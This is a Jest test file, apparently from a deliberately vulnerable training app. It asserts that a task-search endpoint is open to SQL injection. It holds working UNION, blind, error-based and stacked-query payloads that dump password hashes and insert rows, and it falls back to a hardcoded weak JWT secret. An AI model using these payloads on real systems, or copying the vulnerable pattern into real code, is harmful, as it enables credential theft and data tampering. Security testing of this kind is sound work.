import request from 'supertest';
import { app } from '../../src/server';
import { prisma, setupTestDatabase, testUsers } from '../setup';
import jwt from 'jsonwebtoken';

describe('SQL Injection Vulnerability Tests', () => {
  let user1Token: string;
  let user2Token: string;
  let user1Id: number;
  let user2Id: number;

  beforeAll(async () => {
    const users = await setupTestDatabase();
    user1Id = users.user1.id;
    user2Id = users.user2.id;

    // Generate JWT tokens for testing
    user1Token = jwt.sign(
      { userId: user1Id, email: testUsers.user1.email },
      process.env.JWT_SECRET || 'weak-secret-key',
      { expiresIn: '1h' }
    );

    user2Token = jwt.sign(
      { userId: user2Id, email: testUsers.user2.email },
      process.env.JWT_SECRET || 'weak-secret-key',
      { expiresIn: '1h' }
    );

    // Create test tasks
    await prisma.task.createMany({
      data: [
        {
          userId: user1Id,
          title: 'User 1 Task 1',
          description: 'Secret task for user 1',
          priority: 'HIGH',
          status: 'TODO'
        },
        {
          userId: user1Id,
          title: 'User 1 Task 2',
          description: 'Another secret task',
          priority: 'MEDIUM',
          status: 'IN_PROGRESS'
        },
        {
          userId: user2Id,
          title: 'User 2 Task 1',
          description: 'User 2 confidential data',
          priority: 'LOW',
          status: 'TODO'
        }
      ]
    });
  });

  describe('Union-based SQL Injection', () => {
    test('should expose user credentials via UNION attack', async () => {
      const unionPayload = "' UNION SELECT id, email, password_hash, first_name, last_name, created_at FROM users--";
      
      const response = await request(app)
        .get(`/api/tasks/search?query=${encodeURIComponent(unionPayload)}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(200);

      // Verify that user credentials are exposed
      expect(response.body).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            email: expect.any(String),
            password_hash: expect.any(String)
          })
        ])
      );

      // Verify specific user data is leaked
      const leakedUser = response.body.find((item: any) => item.email === testUsers.user2.email);
      expect(leakedUser).toBeDefined();
      expect(leakedUser.password_hash).toBeDefined();
    });

    test('should allow database schema enumeration', async () => {
      const schemaPayload = "' UNION SELECT table_name, column_name, data_type, '1', '2', '3' FROM information_schema.columns WHERE table_schema='public'--";
      
      const response = await request(app)
        .get(`/api/tasks/search?query=${encodeURIComponent(schemaPayload)}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(200);

      // Verify database schema information is exposed
      expect(response.body).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            table_name: expect.any(String),
            column_name: expect.any(String),
            data_type: expect.any(String)
          })
        ])
      );
    });

    test('should extract all tasks from all users', async () => {
      const allTasksPayload = "' UNION SELECT id, title, description, priority::text, status::text, user_id::text FROM tasks--";
      
      const response = await request(app)
        .get(`/api/tasks/search?query=${encodeURIComponent(allTasksPayload)}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(200);

      // Should contain tasks from both users
      const taskTitles = response.body.map((item: any) => item.title || item.id);
      expect(taskTitles).toContain('User 2 Task 1'); // User 1 shouldn't see User 2's tasks normally
    });
  });

  describe('Boolean-based Blind SQL Injection', () => {
    test('should allow data extraction via boolean conditions', async () => {
      // Test if first character of admin email is 'a'
      const booleanPayload = "' AND (SELECT SUBSTRING(email, 1, 1) FROM users WHERE email LIKE 'admin%') = 'a'--";
      
      const response = await request(app)
        .get(`/api/tasks/search?query=${encodeURIComponent(booleanPayload)}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(200);

      // If admin email starts with 'a', should return results
      expect(response.body).toBeDefined();
    });

    test('should confirm user existence via boolean injection', async () => {
      const userExistsPayload = "' AND (SELECT COUNT(*) FROM users WHERE email = 'user2@test.com') > 0--";
      
      const response = await request(app)
        .get(`/api/tasks/search?query=${encodeURIComponent(userExistsPayload)}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(200);

      // Should return results confirming user exists
      expect(Array.isArray(response.body)).toBe(true);
    });
  });

  describe('Error-based SQL Injection', () => {
    test('should expose database errors with sensitive information', async () => {
      const errorPayload = "' AND (SELECT * FROM non_existent_table)--";
      
      const response = await request(app)
        .get(`/api/tasks/search?query=${encodeURIComponent(errorPayload)}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(500);

      // Verify error message exposes database structure
      expect(response.body.error).toContain('relation "non_existent_table" does not exist');
      expect(response.body.details || response.body.error).toBeDefined();
    });

    test('should leak query structure in error messages', async () => {
      const malformedPayload = "' AND 1=CAST('invalid' AS INTEGER)--";
      
      const response = await request(app)
        .get(`/api/tasks/search?query=${encodeURIComponent(malformedPayload)}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(500);

      // Error should reveal SQL query structure
      expect(response.body.error || response.body.details).toMatch(/invalid input syntax|cast/i);
    });
  });

  describe('Time-based Blind SQL Injection', () => {
    test('should allow time-based data extraction', async () => {
      const timePayload = "'; SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN pg_sleep(1) ELSE pg_sleep(0) END--";
      
      const startTime = Date.now();
      
      await request(app)
        .get(`/api/tasks/search?query=${encodeURIComponent(timePayload)}`)
        .set('Authorization', `Bearer ${user1Token}`);
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      
      // Should take at least 1 second due to pg_sleep(1)
      expect(duration).toBeGreaterThan(900); // Allow some margin for execution time
    });
  });

  describe('Advanced SQL Injection Techniques', () => {
    test('should allow stacked queries for data manipulation', async () => {
      const stackedPayload = "'; INSERT INTO tasks (user_id, title, description, priority, status) VALUES (999, 'Injected Task', 'Created via SQL injection', 'HIGH', 'TODO'); --";
      
      await request(app)
        .get(`/api/tasks/search?query=${encodeURIComponent(stackedPayload)}`)
        .set('Authorization', `Bearer ${user1Token}`);

      // Verify the injected task was created
      const injectedTask = await prisma.task.findFirst({
        where: { title: 'Injected Task' }
      });
      
      expect(injectedTask).toBeDefined();
      expect(injectedTask?.description).toBe('Created via SQL injection');
    });

    test('should allow privilege escalation via SQL injection', async () => {
      const privilegePayload = "' UNION SELECT id, 'admin', password_hash, 'Admin', 'User', created_at FROM users WHERE email = 'admin@test.com'--";
      
      const response = await request(app)
        .get(`/api/tasks/search?query=${encodeURIComponent(privilegePayload)}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(200);

      // Should expose admin credentials
      const adminData = response.body.find((item: any) => item.email === 'admin' || item.first_name === 'Admin');
      expect(adminData).toBeDefined();
    });
  });

  describe('SQLMap Compatibility Tests', () => {
    test('should be detectable by automated SQL injection tools', async () => {
      // Test basic injection point detection
      const detectionPayload = "test'";
      
      const response = await request(app)
        .get(`/api/tasks/search?query=${encodeURIComponent(detectionPayload)}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(500);

      // Should return database error indicating injection point
      expect(response.body.error).toMatch(/syntax error|unterminated quoted string/i);
    });

    test('should support UNION-based exploitation for SQLMap', async () => {
      const unionTestPayload = "test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL--";
      
      const response = await request(app)
        .get(`/api/tasks/search?query=${encodeURIComponent(unionTestPayload)}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(200);

      // Should return results indicating successful UNION
      expect(Array.isArray(response.body)).toBe(true);
    });
  });
});